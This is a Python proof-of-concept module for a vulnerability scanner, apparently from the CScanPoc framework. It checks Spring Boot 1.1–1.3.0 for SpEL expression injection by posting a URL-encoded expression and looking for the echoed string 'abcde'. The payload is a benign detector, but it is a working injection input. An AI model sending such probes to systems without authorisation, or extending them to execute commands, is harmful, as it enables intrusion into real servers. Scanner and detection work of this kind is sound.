# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Spring-Framework_0002_p'  # 平台漏洞编号，留空
    name = 'Spring-Framework Boot框架表达式注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-07-08'  # 漏洞公布时间
    desc = '''
    Spring-Framework Boot框架的SpEL表达式注入通用漏洞曝光，利用该漏洞，远程攻击者在服务器上可执行任意命令.
    '''  # 漏洞描述
    ref = 'http://www.cnnetarmy.com/srchunter一款基于python的开源扫描器/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Spring-Framework'  # 漏洞应用名称
    product_version = 'Spring Boot版本：1.1-1.3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1c8235c1-25d9-45c8-867e-2023e419b148'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 命令执行漏洞验证,这里去ping一个服务器做测试或者用dnslog去验证,具体验证结果等服务器搭建起来去完善.
            data = '''%24%7Bnew%20java.lang.String%28new%20byte%5B%5D%7B97%2C98%2C99%2C100%2C101%7D%29%7D.'''
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.post('{target}{data}'.format(
                target=self.target, data=data))
            r = request.text
            if 'abcde' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
